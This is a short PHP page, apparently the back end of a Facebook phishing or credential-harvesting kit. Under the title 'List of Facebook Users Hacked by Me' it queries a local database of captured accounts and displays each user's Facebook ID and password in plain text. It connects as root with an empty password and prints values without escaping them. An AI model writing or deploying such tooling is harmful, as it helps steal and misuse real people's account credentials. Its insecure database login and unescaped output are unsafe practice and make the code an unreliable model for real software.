<?php 
   $conn = mysqli_connect('localhost', 'root', '', 'fbhackedusers');
?>
<!doctype html>
<html>
<head>
   <title>List of Facebook Users Hacked by Me</title>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=yes">
   <style>
      table th, td{border:1px solid black;padding:10px;}
   </style>
</head>
<body>
<?php
   $sql = "select * from fbusers";
   $res = $conn->query($sql);
   echo "<table>";
   echo "<tr>";
   echo "<th>Facebook Id</th>";
   echo "<th>Facebook Password</th>";
   echo "</tr>";
   while($row=mysqli_fetch_row($res))
   {
      echo "<tr><td> $row[1] </td> <td> $row[2] </td></tr>";
   }
   echo "</table>"; 
?>
</body>
</html>